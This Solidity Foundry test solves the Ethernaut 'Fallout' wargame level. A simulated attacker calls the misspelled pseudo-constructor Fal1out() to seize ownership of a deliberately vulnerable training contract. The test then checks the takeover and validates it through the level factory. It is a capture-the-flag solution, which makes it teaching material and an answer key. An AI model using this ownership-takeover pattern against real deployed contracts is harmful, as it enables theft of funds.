// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Fallout} from "src/levels/Fallout.sol";
import {FalloutFactory} from "src/levels/FalloutFactory.sol";

contract FalloutTest is Test {
    Fallout private fallout;
    FalloutFactory private factory;
    address private attacker = makeAddr("attacker");

    function setUp() public {
        factory = new FalloutFactory();

        // Explicit type conversion not allowed from non-payable "address" to "contract Fallback", which has a payable fallback function
        fallout = Fallout(payable(factory.createInstance(attacker)));
    }

    function testFalloutContract() external {
        vm.deal(attacker, 1 ether);

        vm.startPrank(attacker);

        // Call Fal1out() function
        // this will set attacker as the new owner
        fallout.Fal1out();

        address newOwner = fallout.owner();
        assertEq(newOwner, attacker, "New owner not set. Attack failed.");

        // Verify solution using Ethernaut validation
        factory.validateInstance(payable(fallout), attacker);
        vm.stopPrank();
    }
}
